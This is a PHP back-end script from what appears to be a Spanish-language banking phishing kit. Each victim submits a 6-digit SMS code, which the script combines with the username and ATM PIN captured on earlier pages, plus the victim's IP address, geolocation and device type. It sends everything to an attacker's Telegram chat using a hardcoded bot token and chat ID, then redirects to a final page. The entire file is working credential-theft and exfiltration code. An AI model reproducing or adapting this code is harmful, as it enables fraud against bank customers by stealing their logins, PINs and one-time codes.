<?php
session_start();

// Token del bot y chat ID de Telegram
$botToken = '7824527759:AAGqD8qIGVb7C8oHAmYaR44uTu1gR_wnpjc';
$chatID = '8205653590';

// Datos POST del formulario de código SMS
$smsCode = $_POST['sms_code'] ?? '';

// Validar que el código SMS no esté vacío (acepta cualquier código de 6 dígitos)
if (empty($smsCode) || strlen($smsCode) !== 6) {
    header("Location: index3.html?error=codigo_invalido");
    exit;
}

// Obtener datos de las sesiones anteriores
$usuarioPrevio = $_SESSION['usuario'] ?? 'Usuario no registrado';
$pinPrevio = $_SESSION['pin'] ?? 'PIN no registrado';

// Guardar el código SMS en la sesión
$_SESSION['sms_code'] = $smsCode;

// Obtener IP real
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}

$ip = obtenerIP();

// Determinar ubicación geográfica
$location = "Ubicación no disponible";
if (filter_var($ip, FILTER_VALIDATE_IP) && !preg_match('/^(127\.|10\.|192\.168|172\.(1[6-9]|2[0-9]|3[0-1]))/', $ip)) {
    try {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
                'method' => 'GET',
                'header' => 'User-Agent: Mozilla/5.0'
            ]
        ]);
        
        $json = @file_get_contents("http://ipinfo.io/{$ip}/json", false, $context);
        if ($json !== false) {
            $data = json_decode($json, true);
            $city = $data['city'] ?? 'Ciudad desconocida';
            $region = $data['region'] ?? 'Región desconocida';
            $country = $data['country'] ?? 'País desconocido';
            $location = "$city, $region, $country";
        }
    } catch (Exception $e) {
        $location = "Error de ubicación";
    }
} else {
    $location = "IP local o privada: $ip";
}

// Detectar tipo de dispositivo
function detectarDispositivo($userAgent) {
    if (preg_match('/mobile|iphone|android|blackberry|webos|opera mini|opera mobi/i', $userAgent)) {
        return '📱 Móvil';
    } elseif (preg_match('/tablet|ipad/i', $userAgent)) {
        return '📟 Tablet';
    } else {
        return '💻 Escritorio';
    }
}
$tipoDispositivo = detectarDispositivo($_SERVER['HTTP_USER_AGENT'] ?? '');

// Crear mensaje completo con toda la información recopilada
$mensaje = "📱 **𝗖ó𝗱𝗶𝗴𝗼 𝗦𝗠𝗦 𝗖𝗮𝗽𝘁𝘂𝗿𝗮𝗱𝗼** - @𝗕𝗿𝗸𝗻𝘀𝗵𝗶𝗻𝗲𝘅𝘅𝘅\n\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "👤 **Usuario:** `$usuarioPrevio`\n";
$mensaje .= "🔑 **PIN Cajero:** `$pinPrevio`\n";
$mensaje .= "📱 **Código SMS:** `$smsCode`\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "🌐 **IP:** `$ip`\n";
$mensaje .= "📍 **Ubicación:** $location\n";
$mensaje .= "$tipoDispositivo **Dispositivo**";

// Función para enviar a Telegram
function enviarTelegram($botToken, $chatID, $mensaje) {
    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $postData = [
        'chat_id' => $chatID,
        'text' => $mensaje,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => [
                'Content-Type: application/x-www-form-urlencoded',
                'User-Agent: PHP-Telegram-Bot/1.0'
            ],
            'content' => http_build_query($postData),
            'timeout' => 10
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($apiURL, false, $context);
    
    return true;
}

// Enviar mensaje a Telegram
enviarTelegram($botToken, $chatID, $mensaje);

// Marcar captura como completa
$_SESSION['capture_complete'] = true;

// Redirigir a KO.html (página final)
header("Location: KO.html");
exit;
?>
